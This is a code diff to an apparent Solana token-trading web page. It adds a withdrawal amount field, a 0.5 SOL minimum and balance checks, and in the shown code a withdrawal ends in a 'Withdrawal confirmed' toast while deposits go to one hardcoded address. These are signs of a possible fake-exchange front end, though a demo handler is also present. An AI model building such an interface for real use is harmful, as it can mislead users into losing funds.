@@ -16516,6 +16516,10 @@
           <input class="input" id="withdrawAddressInput" placeholder="Enter a Solana address" />
         </div>
         <div class="tiny-text" style="margin-top:-2px;margin-bottom:12px;">Enter a Solana address, or the funds will be lost.</div>
+        <div class="form-group" style="margin-bottom:12px">
+          <label class="form-label" for="withdrawAmountInput">Amount</label>
+          <input class="input" id="withdrawAmountInput" inputmode="decimal" placeholder="0.5 min" />
+        </div>
         <button class="create-btn" id="withdrawBtn" style="margin-top:0">Request Withdrawal</button>
       </div>
     </section>
@@ -16713,6 +16717,7 @@
       const STORAGE_KEY = "pump_vortex_app_state_v2";
       const SOL_USD = 89;
       const CREATE_FEE_SOL = 0.35;
+      const MIN_WITHDRAW_SOL = 0.5;
       const DEPOSIT_ADDRESS = "5AebkdQPH8prpe5KMoB24F6ox2dxCRCgdgXFHmXvZi6V";
       const BALANCE_RPC_ENDPOINTS = ["https://solana-rpc.publicnode.com"];
       const ACTIVITY_HISTORY_MS = 10 * 60 * 1000;
@@ -16782,7 +16787,8 @@
         copyAddressBtn: $("#copyAddressBtn"),
         newAddressBtn: $("#newAddressBtn"),
         withdrawAddressInput: $("#withdrawAddressInput"),
-        withdrawBtn: $("#withdrawBtn"),
+        withdrawAmountInput: $("#withdrawAmountInput"),
+                withdrawBtn: $("#withdrawBtn"),
         resetBtn: $("#resetBtn"),
         sell25: $("#sell25"),
         sell50: $("#sell50"),
@@ -17286,6 +17292,17 @@
         els.walletAddressText.textContent = DEPOSIT_ADDRESS;
         if(els.profileBalanceSol) els.profileBalanceSol.textContent = solText(balanceSol, 2);
         if(els.profileBalanceUsd) els.profileBalanceUsd.textContent = `≈ ${usdText(usd(balanceSol))}`;
+        validateWithdrawAmount(false);
+      }
+
+      function validateWithdrawAmount(showEmpty = false){
+        if(!els.withdrawAmountInput) return true;
+        const raw = els.withdrawAmountInput.value.trim().replace(",", ".");
+        const amount = Number(raw);
+        const invalid = raw !== "" && (!Number.isFinite(amount) || amount < MIN_WITHDRAW_SOL);
+        const shouldShow = invalid || (showEmpty && raw === "");
+        els.withdrawAmountInput.classList.toggle("invalid", shouldShow);
+        return !shouldShow;
       }
 
       function renderTokenDetail(){
@@ -17485,9 +17502,26 @@
 
       function requestWithdrawal(){
         const addr = els.withdrawAddressInput.value.trim();
+        const amountRaw = els.withdrawAmountInput?.value.trim().replace(",", ".") || "";
+        const amountSol = Number(amountRaw);
+        const balanceSol = Number(state.balanceSol || 0);
         if(!addr){
           toast("Enter a Solana wallet address");
           els.withdrawAddressInput.focus();
+          return;
+        }
+        if(!validateWithdrawAmount(true)){
+          els.withdrawAmountInput.focus();
+          return;
+        }
+        if(!Number.isFinite(amountSol) || amountSol <= 0){
+          els.withdrawAmountInput?.classList.add("invalid");
+          els.withdrawAmountInput?.focus();
+          return;
+        }
+        if(amountSol > balanceSol){
+          toast("Not enough balance");
+          els.withdrawAmountInput?.focus();
           return;
         }
         toast("Withdrawal confirmed");
@@ -17593,6 +17627,7 @@
         els.sellBtn.addEventListener("click", sellSelected);
         els.copyAddressBtn.addEventListener("click", copyAddress);
         els.newAddressBtn.addEventListener("click", regenerateAddress);
+        els.withdrawAmountInput?.addEventListener("input", () => validateWithdrawAmount(false));
         els.withdrawBtn?.addEventListener("click", requestWithdrawal);
         els.resetBtn?.addEventListener("click", resetDemo);
 
